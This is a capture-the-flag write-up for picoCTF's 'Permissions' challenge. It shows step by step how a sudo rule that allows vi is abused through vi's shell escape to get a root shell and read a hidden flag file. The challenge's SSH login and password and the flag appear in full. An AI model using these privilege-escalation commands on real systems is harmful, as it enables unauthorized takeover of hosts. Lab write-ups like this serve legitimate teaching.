# Permissions — picoCTF Writeup

**Challenge:** Permissions  
**Category:** General Skills  
**Difficulty:** Medium  
**Points:** 100  
**Flag:** `picoCTF{uS1ng_v1m_3dit0r_ad091ce1}`  
**Platform:** picoCTF 2023  
**Writeup by:** zham  

---

## Description

> Can you read files in the root file?
> The system admin has provisioned an account for you on the main server:
> `ssh -p 55010 picoplayer@saturn.picoctf.net`
> Password: `vCR2tuwCRm`
> Can you login and read the root file?

**Hint 1:** `What permissions do you have?`

---

## Background Knowledge (Read This First!)

### What is `sudo -l`?

`sudo` lets a regular user run specific commands as another user — usually root — without logging in as that user directly. `sudo -l` ("list") shows exactly which commands the current account is allowed to run this way. It's always the first thing to check on a fresh box: it tells you precisely what doors are unlocked for you.

### Why being allowed to `sudo vi` is a real vulnerability

`vi` (and `vim`) is a text editor — but text editors that can run shell commands from inside themselves are a well-known privilege escalation path. This is documented on **GTFOBins** (https://gtfobins.github.io/gtfobins/vi/#sudo): any program with sudo access that can shell out becomes equivalent to full root access, because whatever it spawns inherits the privilege level it was started with.

### What `:!command` does inside vi

Pressing `Esc` to enter command mode, then typing `:` followed by `!`, tells vi to run a shell command without leaving the editor. `:!/bin/bash` specifically spawns a full Bash shell. Since vi itself was launched via `sudo` (as root), the Bash process it spawns is a *child* of that root-privileged vi process — and child processes inherit their parent's privileges. The new shell is root, even though we never typed a root password for it.

### Why `/dev/null` in the one-liner?

`vi` needs a filename argument to open. `/dev/null` is a special "always empty, nothing happens when you write to it" file — passing it means vi opens with a blank, harmless buffer instead of touching any real file on disk.

---

## Solution — Step by Step

### Step 1 — Connect via SSH

```
┌──(zham㉿kali)-[~]
└─$ ssh -p 55010 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: vCR2tuwCRm
picoplayer@challenge:~$
```

### Step 2 — Check sudo permissions

```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: vCR2tuwCRm
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

We can run `vi` as any user — including root — with no restrictions on what we open or do inside it.

### Step 3 — Confirm we can't read `/root` normally

```
picoplayer@challenge:~$ ls -la /root
ls: cannot open directory '/root': Permission denied
```

As expected — we're still a regular user at this point.

### Step 4 — Escalate to root using vi's shell-escape

```
picoplayer@challenge:~$ sudo /usr/bin/vi -c ':!/bin/bash' /dev/null
root@challenge:/home/picoplayer#
```

The `-c ':!/bin/bash'` flag tells vi to immediately run that command-mode instruction on startup — no need to type anything inside the editor at all.

### Step 5 — Confirm root

```
root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# id
uid=0(root) gid=0(root) groups=0(root)
```

### Step 6 — Find and read the flag

```
root@challenge:/home/picoplayer# ls -la /root
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Jun 20 15:20 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile

root@challenge:/home/picoplayer# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
```

The flag is hidden in a dotfile (`.flag.txt`), invisible to a plain `ls` but visible to `ls -la`.

---

## Alternative Methods

### Read the flag without ever spawning a shell

You don't strictly need `:!/bin/bash` at all. Since `sudo vi` is already running as root, vi's own file-read command works just as well:

```
picoplayer@challenge:~$ sudo vi
```

Once inside, press `Esc` to make sure you're in command mode, then type:

```
:r /root/.flag.txt
```

and press `Enter`. This inserts the file's contents directly into the vi buffer — visible right there on screen, no subshell needed.

### Interactive shell-escape instead of the one-liner

If you'd rather not memorize the `-c` flag syntax:

```
picoplayer@challenge:~$ sudo vi
```

Then inside vi, press `Esc`, type `:!/bin/bash`, and press `Enter` — same result as the one-liner, just done in two steps instead of one.

---

## What Happened Internally

```
Timeline:
1. SSH connects as picoplayer — a regular, unprivileged user
2. sudo -l reveals picoplayer can run /usr/bin/vi as any user, no restrictions
3. ls -la /root fails — confirms we don't have root access yet
4. sudo /usr/bin/vi -c ':!/bin/bash' /dev/null — launches vi as root, immediately
   shell-escapes to Bash
5. The spawned Bash process is a child of the root-owned vi process — inherits root
6. whoami/id confirm uid=0 — we are now root
7. ls -la /root reveals the hidden .flag.txt
8. cat /root/.flag.txt — flag read with full root permissions
```

---

## Tools Used

| Tool | Purpose | Level |
|---|---|---|
| `ssh` | Connect to the challenge server | Easy |
| `sudo -l` | Discover which commands can be run as another user | Easy |
| `vi` `-c ':!/bin/bash'` | GTFOBins escalation — shell-escape from inside a root-owned editor | Medium |
| `vi` `:r {file}` | Read a file's contents into the buffer without a shell escape | Easy |
| `ls -la` | Reveal hidden dotfiles a plain `ls` would miss | Easy |

---

## Key Takeaways

- **`sudo -l` is the very first command to run on any new box** — it tells you exactly what's been left unlocked for your account, before you waste time guessing
- **Any sudo-permitted program that can shell out is equivalent to full root access** — text editors, pagers, and even some compilers can do this, and GTFOBins (https://gtfobins.github.io) catalogs the exact syntax for dozens of them
- **Child processes inherit their parent's privilege level** — a shell spawned from inside a root-owned process is root too, with no separate authentication needed
- **Hidden files (`.dotfiles`) don't show up in a plain `ls`** — always reach for `ls -la` when a file you expect to find seems to be missing
- The flag `uS1ng_v1m_3dit0r` is plainly literal here — "using vim editor" — there's no hidden pun this time, just a straightforward callout of the exact tool that got you root
